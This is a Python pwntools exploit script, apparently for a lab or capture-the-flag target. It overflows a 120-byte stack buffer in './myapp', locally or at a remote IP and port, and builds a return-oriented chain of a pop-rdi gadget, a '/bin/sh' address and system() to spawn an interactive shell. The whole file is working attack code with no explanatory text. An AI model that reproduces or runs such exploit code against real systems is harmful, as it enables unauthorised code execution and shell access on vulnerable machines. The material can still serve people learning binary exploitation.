from pwn import *
import struct
import re
import sys

BINARY = './myapp'

IP = "10.10.10.147"
PORT = 1337

LOCAL = True
PRINT = False

# =========================== VARIABLES ======================================
# Length of the vuln buffer
BUFFER_LEN = 112 + 8# 112 + BASE POINTER

BUFFER = b"A" * BUFFER_LEN
# ===========================================================================

def READ():
    try:
        lines = io.recvlines(timeout=1)

        for l in lines:
            sys.stdout.buffer.write(l)
            print()

        return lines
    except EOFError:
        print("[!] End Of File")
        io.close()
        exit()

def PAYLOAD(data):
    io.send(payload)
    io.send("\n")

if not PRINT:
    if LOCAL:
        context.terminal = "bash"
        context.binary = BINARY
        io = process(BINARY)

    else:
        io = remote(IP, PORT)

g1      = p64(0x40120b) # pop rdi ; ret
sh      = p64(0x7ffff7f52cee) # /bin/sh
uptime  = p64(0x40200c)       # /bin/uptime
system  = p64(0x40116e)
main    = p64(0x40115f)

payload = BUFFER
payload += g1
payload += sh
payload += system

if PRINT:
    sys.stdout.buffer.write(payload)
else:
    READ()
    PAYLOAD(payload)
    io.interactive()


    